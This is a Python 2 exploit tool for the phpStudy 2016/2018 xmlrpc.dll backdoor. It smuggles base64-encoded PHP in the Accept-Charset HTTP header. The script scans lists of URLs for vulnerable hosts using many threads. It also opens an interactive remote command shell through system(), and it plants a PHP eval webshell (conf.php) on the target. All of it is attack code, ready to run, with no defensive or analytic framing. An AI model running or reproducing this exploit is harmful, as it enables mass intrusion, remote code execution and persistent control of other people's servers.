# coding:utf-8
# Author:LSA
# Description:phpstudy 2016/2018 xmlrpc.dll backdoor rce
# Date:20190926


import requests
import re
import base64
import sys
import optparse
import threading
import datetime
import os
import Queue

import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

reload(sys)
sys.setdefaultencoding('utf-8')

headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }


lock = threading.Lock()

q0 = Queue.Queue()
threadList = []
global succ
succ = 0

def checkPhpstudyBackdoor(tgtUrl,timeout):

    headers['Accept-Charset'] = 'ZXhpdCgnMTExN2JlZTVhNGZmZDEwMWExODYyNDAzMWQ3ODcxNmYnKTs='

    rsp = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)

    #print rsp.text.encode('utf-8')

    if "1117bee5a4ffd101a18624031d78716f" in rsp.text.encode('utf-8'):
        return True
        #print 'Target is vulnerable!!!' + '\n'
    else:
        return False
        #print 'Target is not vulnerable.' + '\n'


def checkPhpstudyBackdoorBatch(timeout, f4success):
    urllib3.disable_warnings()

    headers['Accept-Charset'] = 'ZXhpdCgnMTExN2JlZTVhNGZmZDEwMWExODYyNDAzMWQ3ODcxNmYnKTs='
    global countLines
    while (not q0.empty()):

        tgtUrl = q0.get()

        qcount = q0.qsize()
        print 'Checking: ' + tgtUrl + ' ---[' + str(countLines - qcount) + '/' + str(countLines) + ']'

        try:
            rst = requests.get(tgtUrl, headers=headers, timeout=timeout, verify=False)

        except requests.exceptions.Timeout:
            continue

        except requests.exceptions.ConnectionError:
            continue
        except:
            continue

        if rst.status_code == 200 and ("1117bee5a4ffd101a18624031d78716f" in rst.text.encode('utf-8')):
            print 'Target is vulnerable!!!---' + tgtUrl + '\n'
            lock.acquire()
            f4success.write('Target is vulnerable!!!---' + tgtUrl + '\n')
            lock.release()
            global succ
            succ = succ + 1

        else:
            continue



def getCmdShellPhpstudyBackdoor(tgtUrl,timeout):
    #pass

    while True:
        command = raw_input("cmd>>> ")
        if command == 'exit':
            break

        command = "system(\"" + command + "\");"

        command = base64.b64encode(command.encode('utf-8'))
        headers['Accept-Charset'] = command
        cmdResult = requests.get(tgtUrl, headers=headers, verify=False,timeout=7)
        print cmdResult.text.encode('utf-8').split('<!')[0]


def phpstudyBackdoorGetshell(tgtUrl,timeout,webpath=''):

    if (webpath == '') or (webpath is None):
        print 'Using default web path:WWW' + '\n'
        headers['Accept-Charset'] = 'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2NvbmYucGhwJyx1cmxkZWNvZGUoJyUzYyUzZnBocCUyMEBldmFsKCUyNF8lNTAlNGYlNTMlNTQlNWIlMjJ4JTIyJTVkKSUzYiUzZiUzZScpKTs='
    else:
        print 'Using specified web path:' + webpath + '\n'
        exp = 'file_put_contents(\'./' + webpath + '/conf.php\',urldecode(\'%3c%3fphp%20@eval(%24_%50%4f%53%54%5b%22x%22%5d)%3b%3f%3e\'));'
        b64exp = base64.b64encode(exp)
        #print exp
        #print b64exp
        headers['Accept-Charset'] = b64exp

    rsp = requests.get(tgtUrl,headers=headers,verify=False,timeout=timeout)

    #print rsp.text.encode('utf-8')

    if rsp.status_code == 200:
        rsp1 = requests.get(tgtUrl+'/conf.php',verify=False,timeout=timeout)
        if (rsp1.status_code == 200) and (rsp1.text == ''):

            #return True
            print 'Getshell successed!!! Shell addr:' + tgtUrl + '/conf.php:x' + '\n'
        else:
            #return False
            print 'Getshell failed.Maybe the web path error(not default WWW),please try it manually or use --web-path(e. myweb).' + '\n'
    else:
        print 'rsp something error!'




if __name__ == '__main__':
    print '''
		********************************
		*     phpstudy backdoor rce    * 
		*         Coded by LSA         * 
		********************************
		'''

    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')

    parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

    parser.add_option('-f', dest='tgtUrlsPath', type='string', help='urls filepath[exploit default]')

    parser.add_option('-s', dest='timeout', type='int', default=7, help='timeout(seconds)')

    parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

    # parser.add_option('--check', dest='check',action='store_true', help='check url but not exploit[default]')

    parser.add_option('--getshell', dest='getshell',action='store_true', help='get webshell')

    parser.add_option('--cmdshell', dest='cmdshell',action='store_true', help='cmd shell mode')

    parser.add_option('--web-path', dest='webpath', type='string', default='WWW', help='web path(default WWW)')

    (options, args) = parser.parse_args()

    # check = options.check

    getshell = options.getshell

    cmdshell = options.cmdshell

    webpath = options.webpath

    timeout = options.timeout

    tgtUrl = options.tgtUrl
    if tgtUrl and (cmdshell is None) and (getshell is None):
        if(checkPhpstudyBackdoor(tgtUrl,timeout)):
            print 'Target is vulnerable!!!' + '\n'
        else:
            print 'Target is not vulnerable.' + '\n'

    if tgtUrl and cmdshell and (getshell is None):
        if (checkPhpstudyBackdoor(tgtUrl,timeout)):
            print 'Target is vulnerable!!! Entering cmdshell...' + '\n'
        else:
            print 'Target is not vulnerable.' + '\n'
            sys.exit()

        getCmdShellPhpstudyBackdoor(tgtUrl,timeout)

    if tgtUrl and (cmdshell is None) and getshell:

        if webpath:
            phpstudyBackdoorGetshell(tgtUrl,timeout,webpath)
        else:
            phpstudyBackdoorGetshell(tgtUrl,timeout)
    if options.tgtUrlsPath:
        tgtFilePath = options.tgtUrlsPath
        threads = options.threads
        nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        os.mkdir('batch_result/' + str(nowtime))
        f4success = open('batch_result/' + str(nowtime) + '/' + 'success.txt', 'w')
        # f4fail = open('batch_result/'+str(nowtime)+'/'+'fail.txt','w')
        urlsFile = open(tgtFilePath)
        global countLines
        countLines = len(open(tgtFilePath, 'rU').readlines())

        print '===Total ' + str(countLines) + ' urls==='

        for urls in urlsFile:
            fullUrls = urls.strip()
            q0.put(fullUrls)
        for thread in range(threads):
            t = threading.Thread(target=checkPhpstudyBackdoorBatch, args=(timeout, f4success))
            t.start()
            threadList.append(t)
        for th in threadList:
            th.join()

        print '\n###Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']###'
        print 'Results were saved in ./batch_result/' + str(nowtime) + '/'
        f4success.close()
    # f4fail.close()


